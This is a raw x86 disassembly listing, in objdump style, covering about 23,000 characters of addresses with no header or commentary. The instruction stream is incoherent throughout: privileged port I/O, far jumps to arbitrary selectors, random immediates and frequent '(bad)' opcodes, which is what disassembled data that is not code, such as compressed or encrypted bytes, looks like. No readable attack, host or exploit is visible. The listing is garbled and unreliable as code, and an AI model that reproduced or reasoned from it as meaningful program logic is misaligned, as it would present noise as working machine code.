  424dd9:	dec    edi
  424dda:	xchg   edx,eax
  424ddb:	popf   
  424ddc:	cmp    edi,eax
  424dde:	leave  
  424ddf:	adc    BYTE PTR [esi-0xc40319a],dl
  424de5:	imul   BYTE PTR [edx-0x4]
  424de8:	mov    dh,0x24
  424dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424deb:	ret    0xc1b2
  424dee:	jae    0x424e0d
  424df0:	fsubr  st(6),st
  424df2:	rol    edx,1
  424df4:	add    eax,0x6b8f746b
  424df9:	loopne 0x424dba
  424dfb:	outs   dx,DWORD PTR ds:[esi]
  424dfc:	add    BYTE PTR [ebx-0x2f],ch
  424dff:	out    dx,al
  424e00:	jmp    0x1e7678f9
  424e05:	test   BYTE PTR [edx+0x6db2b15a],dl
  424e0b:	add    ebx,esi
  424e0d:	mov    ss,WORD PTR [ecx+0x58]
  424e10:	cli    
  424e11:	dec    ebx
  424e12:	push   esp
  424e13:	lock mov ds:0x520b3ab9,eax
  424e19:	cmp    BYTE PTR [esi+edx*8-0x7a],ch
  424e1d:	daa    
  424e1e:	pop    esp
  424e1f:	test   eax,0xbdc35d7a
  424e24:	pop    ds
  424e25:	stos   DWORD PTR es:[edi],eax
  424e26:	fs jno 0x424e7e
  424e29:	xor    BYTE PTR [esi+0x2d],dl
  424e2c:	adc    esi,DWORD PTR [ebx+0xa868dc3]
  424e32:	test   al,0xd1
  424e34:	mov    BYTE PTR [eax-0x6e],bl
  424e37:	mov    ebp,0x9691ef
  424e3c:	jl     0x424e3e
  424e3e:	add    BYTE PTR [eax],al
  424e40:	add    BYTE PTR [eax],al
  424e42:	add    BYTE PTR [edi+ecx*2+0x7],0xcf
  424e47:	bswap  eax
  424e49:	(bad)  
  424e4a:	test   al,0x2c
  424e4c:	dec    eax
  424e4d:	or     ecx,DWORD PTR [eax-0x355e8c6]
  424e53:	mov    BYTE PTR [ecx],0x0
  424e56:	repz add al,0x0
  424e59:	add    BYTE PTR [edx+0x17667846],ch
  424e5f:	sbb    DWORD PTR [ebp+0x3d],edi
  424e62:	adc    al,0x88
  424e64:	push   ebp
  424e65:	sub    eax,0x3f3e0238
  424e6a:	push   0x68
  424e6c:	out    0x41,eax
  424e6e:	outs   dx,BYTE PTR ds:[esi]
  424e6f:	fcmove st,st(6)
  424e71:	adc    DWORD PTR [esi],esi
  424e73:	jmp    edx
  424e75:	(bad)  
  424e76:	out    dx,al
  424e77:	mov    cl,BYTE PTR [ebp+0x3657bd5b]
  424e7d:	sub    bl,dl
  424e7f:	retf   0xbd94
  424e82:	arpl   WORD PTR [edi+0x39],sp
  424e85:	dec    eax
  424e86:	pop    ecx
  424e87:	imul   bl
  424e89:	setno  BYTE PTR [ebx+0x5f6cfe23]
  424e90:	fs retf 
  424e92:	call   0xe0d783c2
  424e97:	adc    eax,0x42d27be5
  424e9c:	sub    DWORD PTR [eax-0x2a306c0b],0xffffffe1
  424ea3:	jae    0x424e32
  424ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ea6:	dec    DWORD PTR [ecx-0x1379474e]
  424eac:	bound  eax,QWORD PTR [eax-0x17]
  424eaf:	mov    cl,0x66
  424eb1:	add    al,0x12
  424eb3:	dec    ecx
  424eb4:	xor    eax,0xef145928
  424eb9:	mov    al,0x3d
  424ebb:	fiadd  WORD PTR [ebx-0x38]
  424ebe:	pop    esi
  424ebf:	in     al,dx
  424ec0:	dec    ebp
  424ec1:	iret   
  424ec2:	or     eax,0x3ff85173
  424ec7:	xchg   esi,eax
  424ec8:	xchg   edi,eax
  424ec9:	or     al,0x9
  424ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ecc:	and    eax,0x1679b656
  424ed1:	es inc edi
  424ed3:	loop   0x424f0d
  424ed5:	outs   dx,BYTE PTR ds:[esi]
  424ed6:	pop    esp
  424ed7:	repnz loopne 0x424ed7
  424eda:	inc    edi
  424edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424edc:	stos   BYTE PTR es:[edi],al
  424edd:	jo     0x424f25
  424edf:	push   ebx
  424ee0:	fsub   st(2),st
  424ee2:	out    0xba,eax
  424ee4:	fldenv [eax]
  424ee6:	add    edi,ebp
  424ee8:	mov    ebp,0x32fe28f6
  424eed:	scas   eax,DWORD PTR es:[edi]
  424eee:	cwde   
  424eef:	inc    ebp
  424ef0:	lea    esi,[eax+ebx*8+0x1398ddb1]
  424ef7:	mov    dh,0x23
  424ef9:	aam    0xa9
  424efb:	call   0xa3de:0xbf792b26
  424f02:	mov    bh,0xed
  424f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f05:	popa   
  424f06:	add    al,0xf4
  424f08:	mov    dh,0x68
  424f0a:	xchg   edi,eax
  424f0b:	iret   
  424f0c:	xchg   edx,eax
  424f0d:	xchg   ebp,eax
  424f0e:	xlat   BYTE PTR ds:[ebx]
  424f0f:	adc    BYTE PTR [esi+0x30c9a722],dh
  424f15:	imul   DWORD PTR [ecx+0x4245e714]
  424f1b:	mov    ebp,0x3b971b5f
  424f20:	pusha  
  424f21:	sbb    cl,ch
  424f23:	stos   BYTE PTR es:[edi],al
  424f24:	loopne 0x424ef0
  424f26:	imul   eax,DWORD PTR [esi-0x493c7a8f],0xdf0e215
  424f30:	or     ah,BYTE PTR ds:0xc20dad8b
  424f36:	or     DWORD PTR [edi+0x556f6a59],esi
  424f3c:	mov    dl,bl
  424f3e:	xor    ah,BYTE PTR [edi+0x5fe2cf5a]
  424f44:	in     al,0xac
  424f46:	dec    eax
  424f47:	inc    edi
  424f48:	shl    DWORD PTR [ebx+0x7a],1
  424f4b:	fidiv  DWORD PTR [esi+ecx*8+0x16]
  424f4f:	xchg   ecx,eax
  424f50:	pop    eax
  424f51:	cs std 
  424f53:	sbb    al,0x96
  424f55:	shl    ecx,1
  424f57:	sub    edi,DWORD PTR [edx]
  424f59:	mov    DWORD PTR [ecx+edx*4],edi
  424f5c:	outs   dx,BYTE PTR ds:[esi]
  424f5d:	lods   eax,DWORD PTR ds:[esi]
  424f5e:	ins    BYTE PTR es:[edi],dx
  424f5f:	xchg   esp,edi
  424f61:	dec    esi
  424f62:	outs   dx,BYTE PTR ds:[esi]
  424f63:	lods   al,BYTE PTR ds:[esi]
  424f64:	test   DWORD PTR [ecx+eax*1],esp
  424f67:	mov    es,WORD PTR [ecx]
  424f69:	cmc    
  424f6a:	pop    edx
  424f6b:	enter  0xa8e9,0xeb
  424f6f:	mov    fs,edi
  424f71:	mov    BYTE PTR [ecx],cl
  424f73:	cli    
  424f74:	mov    edi,0xcf9fe6af
  424f79:	pop    ss
  424f7a:	xor    ecx,DWORD PTR [ebx+0x6fb95271]
  424f80:	ss mov ah,0xf8
  424f83:	cdq    
  424f84:	xor    bl,ch
  424f86:	lss    edi,FWORD PTR [ebx]
  424f89:	dec    esi
  424f8a:	xchg   ebx,eax
  424f8b:	cmp    eax,0xc35b5bef
  424f90:	cmc    
  424f91:	pop    es
  424f92:	or     ebx,eax
  424f94:	inc    ebx
  424f95:	add    eax,0x9ef40453
  424f9a:	dec    ebx
  424f9b:	cmp    eax,edx
  424f9d:	and    DWORD PTR [ebx+0x7744fb30],esi
  424fa3:	imul   esi,ecx,0x11cede73
  424fa9:	adc    eax,0x1fb569a1
  424fae:	clc    
  424faf:	push   eax
  424fb0:	jmp    0x39c4c163
  424fb5:	xchg   ecx,eax
  424fb6:	add    ebp,DWORD PTR [esi]
  424fb8:	mov    edi,0x65320229
  424fbd:	aam    0xd4
  424fbf:	aaa    
  424fc0:	fisubr DWORD PTR [edx-0x4cc0532f]
  424fc6:	xchg   BYTE PTR ds:0x339bce87,dh
  424fcc:	lods   al,BYTE PTR ds:[esi]
  424fcd:	sub    ebx,DWORD PTR [esi+0x3dc81686]
  424fd3:	push   eax
  424fd4:	jbe    0x42501b
  424fd6:	aaa    
  424fd7:	adc    cl,BYTE PTR [esi+ebx*1]
  424fda:	add    al,0x8d
  424fdc:	fsub   DWORD PTR [edi+0x98b56cf]
  424fe2:	test   BYTE PTR [eax+eax*4+0x7c],dl
  424fe6:	and    eax,DWORD PTR [ebx+0x69c30eb]
  424fec:	jle    0x425012
  424fee:	pop    es
  424fef:	in     eax,dx
  424ff0:	jnp    0x424fd7
  424ff2:	inc    esi
  424ff3:	xchg   edx,eax
  424ff4:	sbb    al,0x73
  424ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ff7:	cmp    DWORD PTR [ecx-0x15],0xfffffffc
  424ffb:	pop    ss
  424ffc:	mov    ebp,DWORD PTR ds:0x4d692794
  425002:	adc    BYTE PTR [ebx+0x5e2fd846],cl
  425008:	xchg   ebx,eax
  425009:	lods   al,BYTE PTR ds:[esi]
  42500a:	(bad)  
  42500b:	gs idiv bh
  42500e:	push   ebp
  42500f:	dec    edx
  425010:	or     ebp,DWORD PTR [ecx]
  425012:	ins    DWORD PTR es:[edi],dx
  425013:	xchg   esp,eax
  425014:	cld    
  425015:	repz das 
  425017:	adc    al,0xf5
  425019:	push   ss
  42501a:	pop    ebp
  42501b:	or     al,0xaa
  42501d:	ror    BYTE PTR [ecx-0x28],0x53
  425021:	inc    edx
  425022:	int3   
  425023:	mov    edx,0x49e19407
  425028:	(bad)  
  42502b:	sbb    esi,DWORD PTR [esi+0x10]
  42502e:	sub    ebx,ebx
  425030:	in     al,0x6d
  425032:	pop    ecx
  425033:	cmp    bl,BYTE PTR [edi]
  425035:	dec    ebp
  425036:	mov    al,ds:0xf3dec6a4
  42503b:	xor    dh,BYTE PTR [ecx+0x60]
  42503e:	js     0x425073
  425040:	and    al,0x87
  425042:	mov    edx,0x3a07eb5
  425047:	pop    ebx
  425048:	and    eax,0xb4a5e723
  42504d:	inc    edi
  42504e:	ficomp DWORD PTR ds:0x30377f26
  425054:	rol    BYTE PTR [ebp+ecx*4+0x15cde7d9],cl
  42505b:	push   0x25d92c92
  425060:	pop    ebx
  425061:	add    al,0x29
  425063:	cmc    
  425064:	push   ebp
  425065:	dec    ebp
  425066:	iret   
  425067:	inc    edi
  425068:	jle    0x4250a2
  42506a:	cmp    di,WORD PTR [esi+esi*8+0x15c9eb9b]
  425072:	add    al,0xee
  425074:	dec    ebp
  425075:	push   edx
  425076:	ja     0x4250b3
  425078:	shr    DWORD PTR [edi+edi*8],0x93
  42507c:	ds int3 
  42507e:	fcom   QWORD PTR ds:0x97a4791a
  425084:	and    eax,0x5169d403
  425089:	pusha  
  42508a:	mov    esp,0x641cf8c1
  42508f:	mov    eax,0x33b12b7
  425094:	xchg   edi,eax
  425095:	daa    
  425096:	pop    esp
  425097:	hlt    
  425098:	out    dx,eax
  425099:	sub    al,0x36
  42509b:	and    eax,0x5f9d826c
  4250a0:	adc    cl,dh
  4250a2:	(bad)  
  4250a3:	scas   eax,DWORD PTR es:[edi]
  4250a4:	(bad)  
  4250a5:	push   ds
  4250a6:	mov    ebx,DWORD PTR [edi-0x2ea9a5aa]
  4250ac:	inc    esp
  4250ad:	ja     0x425064
  4250af:	sar    BYTE PTR [ebx],cl
  4250b1:	jmp    0xf31e:0xca547e09
  4250b8:	xor    ebp,DWORD PTR [edx]
  4250ba:	adc    eax,DWORD PTR [eax+0x364328e3]
  4250c0:	mov    ds:0x24f92101,eax
  4250c5:	and    eax,0x229ae9d
  4250ca:	xchg   ebp,eax
  4250cb:	fwait
  4250cc:	dec    edx
  4250cd:	jle    0x425114
  4250cf:	std    
  4250d0:	ficomp DWORD PTR [ecx+0x38f1b542]
  4250d6:	mov    ebx,eax
  4250d8:	push   esi
  4250d9:	sub    ch,ah
  4250db:	fcmovne st,st(1)
  4250dd:	sub    eax,0x3f8a9a3a
  4250e2:	adc    ch,BYTE PTR [bp+si]
  4250e5:	out    0x71,eax
  4250e7:	lods   al,BYTE PTR ds:[esi]
  4250e8:	nop
  4250e9:	cwde   
  4250ea:	mov    bh,0x38
  4250ec:	aad    0xb2
  4250ee:	sub    BYTE PTR [esi+ebx*1],0x73
  4250f2:	xchg   esi,eax
  4250f3:	sbb    dl,dh
  4250f5:	lds    esi,FWORD PTR [edi-0x1045367d]
  4250fb:	dec    edi
  4250fc:	add    BYTE PTR [ebx-0x76],0x66
  425100:	or     esi,ebx
  425102:	jecxz  0x4250dc
  425104:	push   edi
  425105:	adc    ebp,DWORD PTR [edi]
  425107:	lea    edi,fs:[eax]
  42510a:	xor    eax,eax
  42510c:	xchg   esp,eax
  42510d:	xchg   BYTE PTR [edi+0x23],ah
  425110:	test   eax,0xde267bd2
  425115:	xor    al,0xc4
  425117:	sub    DWORD PTR [esi-0x644030b3],0x51
  42511e:	inc    ecx
  42511f:	adc    DWORD PTR [edi+edx*1-0x4a],ebp
  425123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425124:	shl    BYTE PTR [ecx],cl
  425126:	shl    DWORD PTR [ecx-0x18],0xef
  42512a:	jns    0x425139
  42512c:	jle    0x4250be
  42512e:	stos   DWORD PTR es:[edi],eax
  42512f:	push   edx
  425130:	push   edx
  425131:	loopne 0x4250ce
  425133:	sbb    esi,DWORD PTR [eax-0x33]
  425136:	xor    BYTE PTR [ebp-0x72],0xb4
  42513a:	test   eax,0x163ca13a
  42513f:	arpl   dx,sp
  425141:	ins    DWORD PTR es:[edi],dx
  425142:	mov    al,0x27
  425144:	shl    DWORD PTR [ebp-0x4e],cl
  425147:	inc    esi
  425148:	cmp    ch,ch
  42514a:	jno    0x425151
  42514c:	pop    es
  42514d:	dec    esp
  42514e:	inc    edi
  42514f:	out    0x6f,al
  425151:	xor    edi,DWORD PTR [edi-0x62]
  425154:	cdq    
  425155:	cmp    eax,0x99bea3b6
  42515a:	movhps QWORD PTR [eax+0x39],xmm0
  42515e:	xchg   dl,al
  425160:	sbb    ecx,ebp
  425162:	xor    BYTE PTR [ecx+0x5f2a05fb],bl
  425168:	xor    DWORD PTR [ecx],0x6b
  42516b:	fcmovnu st,st(1)
  42516d:	retf   
  42516e:	mov    edx,0xb2bac0a8
  425173:	dec    eax
  425174:	js     0x425124
  425176:	and    eax,0x9a1f0f7c
  42517b:	mov    BYTE PTR [esi+0x3],cl
  42517e:	popa   
  42517f:	sub    edi,ecx
  425181:	loope  0x425145
  425183:	jns    0x4251f2
  425185:	mov    bh,0x9
  425187:	jnp    0x4251de
  425189:	sbb    al,0x9e
  42518b:	mov    ebp,0x17bacecc
  425190:	and    DWORD PTR [ebx-0xf],ecx
  425193:	clc    
  425194:	imul   DWORD PTR [eax+esi*4-0x388ab536]
  42519b:	nop
  42519c:	pop    ds
  42519d:	push   ds
  42519e:	cmp    al,ch
  4251a0:	retf   
  4251a1:	fmul   QWORD PTR [edi+0x7b20fb11]
  4251a7:	mov    WORD PTR [edi-0x3d],ds
  4251aa:	dec    ebp
  4251ab:	rol    DWORD PTR [ebx],1
  4251ad:	jo     0x425181
  4251af:	(bad)
  4251b2:	xchg   ebp,eax
  4251b3:	xor    al,BYTE PTR [eax+ebp*2+0x25]
  4251b7:	daa    
  4251b8:	adc    DWORD PTR [edx],ebx
  4251ba:	shl    DWORD PTR [ecx+eiz*1],0x90
  4251be:	xchg   esi,eax
  4251bf:	enter  0xa231,0x26
  4251c3:	mov    edx,0x74e7abaa
  4251c8:	jnp    0x425224
  4251ca:	enter  0x19aa,0xd5
  4251ce:	add    al,0xfb
  4251d0:	cs leave 
  4251d2:	mov    WORD PTR [ebx-0xe3ade69],gs
  4251d8:	dec    esp
  4251d9:	mov    al,0xd4
  4251db:	neg    DWORD PTR [ebx]
  4251dd:	inc    edx
  4251de:	std    
  4251df:	out    dx,al
  4251e0:	dec    esi
  4251e1:	mov    esi,esp
  4251e3:	call   0x3801:0x831de088
  4251ea:	xor    al,0xd2
  4251ec:	adc    DWORD PTR [esi],ebp
  4251ee:	es (bad) 
  4251f1:	ffreep st(3)
  4251f3:	clc    
  4251f4:	add    ch,BYTE PTR [ebx+0x2b4ff208]
  4251fa:	xchg   edi,eax
  4251fb:	mov    esi,0xa754067e
  425200:	and    BYTE PTR ds:0xfefa697f,ch
  425206:	push   eax
  425207:	shl    BYTE PTR [esi+0xe],0x70
  42520b:	lds    eax,FWORD PTR [eax]
  42520d:	cmp    al,0x17
  42520f:	in     eax,0xaa
  425211:	and    edx,edx
  425213:	mov    esp,0xe43c2cd
  425218:	push   es
  425219:	mov    al,ds:0xfeffd0e
  42521e:	adc    esp,ecx
  425220:	je     0x42524b
  425222:	xchg   edx,eax
  425223:	jnp    0x42523f
  425225:	jmp    0xb1a0:0x47c6e001
  42522c:	(bad)  
  42522d:	jns    0x4252ad
  42522f:	mov    bl,0xc3
  425231:	pop    ebp
  425232:	mov    ebx,0xc55e5d79
  425237:	mov    ds:0xa291d554,al
  42523c:	es pop esi
  42523e:	pop    ss
  42523f:	mov    cl,0xe
  425241:	xchg   ecx,eax
  425242:	adc    al,0x4d
  425244:	add    BYTE PTR ds:0xc04eadf9,ah
  42524a:	ss push ebp
  42524c:	inc    di
  42524e:	sbb    eax,0xca8ef852
  425253:	fs leave 
  425255:	push   ebp
  425256:	not    DWORD PTR [eax-0x27]
  425259:	inc    ebx
  42525a:	test   eax,0x1e67d61b
  42525f:	test   al,0x4b
  425261:	pop    ebx
  425262:	ret    0x64a2
  425265:	add    DWORD PTR ss:[ebx],ebx
  425268:	push   edi
  425269:	and    BYTE PTR [edi-0x10],ah
  42526c:	pop    esp
  42526d:	out    dx,eax
  42526e:	adc    eax,0x302f1d25
  425273:	ss push edx
  425275:	lahf   
  425276:	ror    BYTE PTR [ecx-0x2965638c],0xd0
  42527d:	call   0x687be1d8
  425282:	(bad)  
  425283:	std    
  425284:	sub    BYTE PTR [ecx],0x94
  425287:	pusha  
  425288:	push   edi
  425289:	mov    ecx,0xcc697fa5
  42528e:	inc    ebx
  42528f:	dec    edx
  425290:	mov    ecx,0xedea4dbf
  425295:	aas    
  425296:	into   
  425297:	push   esp
  425298:	lods   eax,DWORD PTR ds:[esi]
  425299:	xchg   esi,eax
  42529a:	ss aas 
  42529c:	dec    esi
  42529d:	push   0xa52a7a8b
  4252a2:	and    DWORD PTR [eax-0x5ad36083],ebp
  4252a8:	push   esi
  4252a9:	fisubr DWORD PTR [ecx+0x1f]
  4252ac:	adc    BYTE PTR [ebp+0x60cdb7f4],ch
  4252b2:	aad    0xfb
  4252b4:	cmp    eax,0x67c82d0c
  4252b9:	scas   eax,DWORD PTR es:[edi]
  4252ba:	push   0x4d51cc04
  4252bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252c0:	xorps  xmm2,XMMWORD PTR [bp+si]
  4252c4:	and    al,0x50
  4252c6:	mov    eax,0xe9d13c2a
  4252cb:	call   0x681cd007
  4252d0:	add    dl,BYTE PTR [esi-0x42898800]
  4252d6:	mov    ds:0xc12e4305,eax
  4252db:	sbb    DWORD PTR [ebp+edx*4-0x6d86096e],ebp
  4252e2:	mov    eax,DWORD PTR [edi]
  4252e4:	fwait
  4252e5:	pushf  
  4252e6:	aaa    
  4252e7:	sbb    al,0xf5
  4252e9:	int3   
  4252ea:	jle    0x42531b
  4252ec:	xchg   esp,eax
  4252ed:	adc    BYTE PTR [ebx+0x5b8187ca],bh
  4252f3:	xchg   DWORD PTR [ebx],ebx
  4252f5:	inc    ebp
  4252f6:	ss mov edi,0x208dc7de
  4252fc:	rcl    BYTE PTR [edx+0x60],cl
  4252ff:	cmp    DWORD PTR [edx-0xf],edx
  425302:	sbb    ebx,DWORD PTR [eax]
  425304:	and    eax,0x63bca580
  425309:	lahf   
  42530a:	mov    ds:0xd6044a8e,eax
  42530f:	push   cs
  425310:	aam    0x2e
  425312:	inc    esp
  425313:	pop    eax
  425314:	bnd jnp 0x425357
  425317:	jo     0x425396
  425319:	xchg   esp,eax
  42531a:	xchg   ecx,eax
  42531b:	(bad)  
  42531c:	mov    ebp,0x87e7137d
  425321:	xchg   esi,eax
  425322:	mov    ah,0xe7
  425324:	xor    eax,DWORD PTR ds:0x2fbe40cd
  42532a:	adc    BYTE PTR [ebx+edi*1],ah
  42532d:	adc    al,0x60
  42532f:	ret    
  425330:	sbb    BYTE PTR [ecx],0x6a
  425333:	stos   DWORD PTR es:[di],eax
  425335:	adc    al,0xe7
  425337:	loop   0x42533b
  425339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42533a:	aad    0x4b
  42533c:	jle    0x42536e
  42533e:	dec    edi
  42533f:	lahf   
  425340:	fild   DWORD PTR [edx+0x50]
  425343:	jns    0x4252cf
  425345:	mov    bh,0x1f
  425347:	retf   0x6a47
  42534a:	enter  0x36b1,0x0
  42534e:	add    BYTE PTR [eax],al
  425350:	add    BYTE PTR [eax],al
  425352:	fwait
  425353:	push   ebp
  425354:	pusha  
  425355:	outs   dx,DWORD PTR ds:[esi]
  425356:	out    dx,al
  425357:	jg     0x4252f8
  425359:	cmc    
  42535a:	or     DWORD PTR fs:[edi+0x22],ebx
  42535e:	pop    eax
  42535f:	(bad)  
  425360:	jp     0x4252ed
  425362:	out    dx,eax
  425363:	retf   
  425364:	add    DWORD PTR [eax],eax
  425366:	repz add al,0x0
  425369:	add    BYTE PTR [edx+edx*8],ch
  42536c:	stos   DWORD PTR es:[edi],eax
  42536d:	and    BYTE PTR [ecx],ah
  42536f:	jecxz  0x4253d0
  425371:	cmp    eax,0xe4e97ad4
  425376:	pop    eax
  425377:	adc    al,0x97
  425379:	(bad)  
  42537a:	inc    esp
  42537b:	je     0x425302
  42537d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42537e:	push   esi
  42537f:	sar    DWORD PTR [edi+0x26],1
  425382:	fisubr WORD PTR [esi]
  425384:	xchg   esp,ebx
  425386:	push   ecx
  425387:	push   ds
  425388:	stos   DWORD PTR es:[edi],eax
  425389:	jbe    0x4253a4
  42538b:	iret   
  42538c:	ds jg  0x4253e9
  42538f:	dec    ebp
  425390:	(bad)  
  425391:	add    al,bl
  425393:	push   ss
  425394:	daa    
  425395:	test   BYTE PTR [ebx+0x16],dl
  425398:	inc    ebp
  425399:	das    
  42539a:	js     0x4253e5
  42539c:	rcr    BYTE PTR [esi+0x2ca49203],1
  4253a2:	add    al,0xfd
  4253a4:	add    ch,cl
  4253a6:	mov    dh,0x40
  4253a8:	jmp    0x105d:0x69cfe17a
  4253af:	outs   dx,BYTE PTR ds:[esi]
  4253b0:	ror    dh,0x86
  4253b3:	push   ecx
  4253b4:	mov    WORD PTR [ecx+0x13955f57],ss
  4253ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253bb:	fist   DWORD PTR [eax]
  4253bd:	retf   
  4253be:	mov    BYTE PTR [ebp+0x77],al
  4253c1:	stos   DWORD PTR es:[edi],eax
  4253c2:	fiadd  DWORD PTR ds:0x27733622
  4253c8:	inc    ebx
  4253c9:	cdq    
  4253ca:	sub    eax,0x891c316b
  4253cf:	or     bh,ch
  4253d1:	or     ebp,DWORD PTR [esi+0x2a]
  4253d4:	mov    al,0x5d
  4253d6:	push   es
  4253d7:	push   ecx
  4253d8:	lods   eax,DWORD PTR ds:[esi]
  4253d9:	imul   esi,esp,0x7f9600af
  4253df:	push   0x443a8ae4
  4253e4:	pop    ebp
  4253e5:	jns    0x4253a5
  4253e7:	mov    edx,0x35276483
  4253ec:	neg    esp
  4253ee:	pop    ebx
  4253ef:	ret    0x68c3
  4253f2:	cmp    al,0x4e
  4253f4:	mov    ds:0x7c6f05ad,eax
  4253f9:	push   esp
  4253fa:	push   ebp
  4253fb:	dec    esi
  4253fc:	pop    es
  4253fd:	and    BYTE PTR [esi],ch
  4253ff:	pop    eax
  425400:	dec    eax
  425401:	cmovae ecx,DWORD PTR [edx-0x388180bf]
  425408:	fstp   st(6)
  42540a:	inc    ecx
  42540b:	push   esp
  42540c:	add    al,0xda
  42540e:	xor    esi,0xb9b38462
  425414:	outs   dx,DWORD PTR ds:[esi]
  425415:	jbe    0x4253b6
  425417:	push   eax
  425418:	sub    BYTE PTR [ebx+0x7f93f07c],ch
  42541e:	push   ds
  42541f:	stos   BYTE PTR es:[edi],al
  425420:	aas    
  425421:	into   
  425422:	push   edi
  425423:	out    0x98,al
  425425:	outs   dx,DWORD PTR ds:[esi]
  425426:	add    DWORD PTR [ebx-0x5c],0xc8365481
  42542d:	sub    BYTE PTR [eax],cl
  42542f:	mov    ecx,0x4ccc9b19
  425434:	push   ds
  425435:	xchg   ebp,eax
  425436:	outs   dx,DWORD PTR ds:[esi]
  425437:	jmp    0xb0c3c0ff
  42543c:	pop    ss
  42543d:	leave  
  42543e:	sub    eax,0x820fd04e
  425443:	addr16 popf 
  425445:	or     al,0x60
  425447:	and    BYTE PTR [eax],bl
  425449:	sbb    BYTE PTR [eax+eiz*1],0x4e
  42544d:	xchg   edi,eax
  42544e:	inc    edi
  42544f:	mov    al,0x62
  425451:	xchg   edi,esi
  425453:	xor    DWORD PTR [esi-0x7a],esp
  425456:	call   0x2bc4:0x1fd046c5
  42545d:	imul   esi,DWORD PTR [edx-0x42],0xf75249fd
  425464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425465:	xchg   DWORD PTR [edx],ecx
  425467:	gs xor DWORD PTR ss:[eax-0x29c9b194],ebx
  42546f:	in     al,0x76
  425471:	add    bh,bl
  425473:	fistp  WORD PTR [edx+0xc]
  425476:	push   es
  425477:	inc    esi
  425478:	in     al,dx
  425479:	mov    al,0xbf
  42547b:	and    DWORD PTR [edx+0x1],ebp
  42547e:	add    bh,bl
  425480:	cmp    eax,DWORD PTR [ebx+ecx*4-0x49b7705f]
  425487:	sub    sp,WORD PTR [edi-0x3d9f0e6a]
  42548e:	ret    
  42548f:	into   
  425490:	adc    DWORD PTR [ecx-0x66],esi
  425493:	out    0x14,al
  425495:	sbb    dh,ah
  425497:	fidiv  WORD PTR [esi]
  425499:	sub    BYTE PTR [esi-0x52],0x62
  42549d:	rcr    DWORD PTR [edx+0x36edf875],cl
  4254a3:	outs   dx,DWORD PTR ds:[esi]
  4254a4:	or     al,0x56
  4254a6:	or     bh,BYTE PTR [esi-0x5a]
  4254a9:	xchg   esi,eax
  4254aa:	cs xor al,0x4
  4254ad:	push   esi
  4254ae:	jns    0x4254f3
  4254b0:	and    bh,BYTE PTR gs:[edi]
  4254b3:	ins    DWORD PTR es:[edi],dx
  4254b4:	aaa    
  4254b5:	test   eax,0xa726d158
  4254ba:	inc    esi
  4254bb:	add    edi,DWORD PTR [ecx+0x260c75a7]
  4254c1:	scas   eax,DWORD PTR es:[edi]
  4254c2:	ror    DWORD PTR [ebx-0x43],cl
  4254c5:	clc    
  4254c6:	cmp    bh,BYTE PTR [edi-0xf8ca9c5]
  4254cc:	cmp    BYTE PTR [edx-0x183cb211],ch
  4254d2:	retf   0xf481
  4254d5:	or     DWORD PTR [ebx-0x6f],eax
  4254d8:	mov    al,ds:0x232bdeec
  4254dd:	xor    esp,eax
  4254df:	inc    esp
  4254e0:	icebp  
  4254e1:	mov    eax,0x1acdc573
  4254e6:	(bad)  
  4254e8:	dec    esp
  4254e9:	call   0x59685191
  4254ee:	jecxz  0x42555f
  4254f0:	ret    
  4254f1:	xchg   edx,eax
  4254f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254f3:	stc    
  4254f4:	pop    ebp
  4254f5:	pop    eax
  4254f6:	jmp    0x93b445cd
  4254fb:	jl     0x425495
  4254fd:	sbb    DWORD PTR [ecx+0x7],0xffffffc8
  425501:	hlt    
  425502:	or     eax,0xea65ffab
  425507:	cs push cs
  425509:	jae    0x425582
  42550b:	(bad)  
  42550c:	ficom  DWORD PTR [esi]
  42550e:	ds mov al,0x1c
  425511:	push   0xfffffffc
  425513:	aaa    
  425514:	jbe    0x42555a
  425516:	dec    edi
  425517:	cli    
  425518:	jo     0x42554f
  42551a:	rcr    DWORD PTR [esi],1
  42551c:	test   DWORD PTR [eax-0x47],ecx
  42551f:	jmp    0xcdda:0xf300949
  425526:	out    0x36,eax
  425528:	add    DWORD PTR [ebp+0xe4a1f24],esi
  42552e:	jb     0x4254f3
  425530:	outs   dx,DWORD PTR ds:[esi]
  425531:	push   edi
  425532:	xor    bh,BYTE PTR [eax+0x3481013d]
  425538:	and    BYTE PTR [ecx],cl
  42553a:	cli    
  42553b:	das    
  42553c:	sbb    ch,bh
  42553e:	inc    ecx
  42553f:	test   al,0xc0
  425541:	shl    dl,1
  425543:	xchg   esi,eax
  425544:	icebp  
  425545:	add    BYTE PTR [eax],bl
  425547:	jmp    0x30fe051
  42554c:	push   ebx
  42554d:	xor    esp,DWORD PTR [esi+0x28]
  425550:	nop
  425551:	jp     0x425531
  425553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425554:	mov    al,0xf4
  425556:	mov    cl,0xde
  425558:	sub    DWORD PTR [ecx],edi
  42555a:	cdq    
  42555b:	and    al,0x10
  42555d:	ret    0x5ac4
  425560:	pushf  
  425561:	cmp    al,0xa3
  425563:	adc    edi,DWORD PTR [esi]
  425565:	xchg   edx,eax
  425566:	xchg   esi,eax
  425567:	push   ebp
  425568:	fs loope 0x4255c4
  42556b:	pushf  
  42556c:	in     eax,dx
  42556d:	lahf   
  42556e:	jp     0x4255c9
  425570:	mov    ds:0x1c74823c,eax
  425575:	ret    
  425576:	pop    esi
  425577:	mov    dl,0x42
  425579:	push   es
  42557a:	ss int 0xf4
  42557d:	clc    
  42557e:	lods   eax,DWORD PTR ds:[esi]
  42557f:	pusha  
  425580:	mov    ah,0x18
  425582:	mov    al,0x68
  425584:	cmp    DWORD PTR [ebx],ebp
  425586:	ret    0x5c0c
  425589:	out    dx,eax
  42558a:	mov    eax,ds:0x56085fa8
  42558f:	jo     0x4255c1
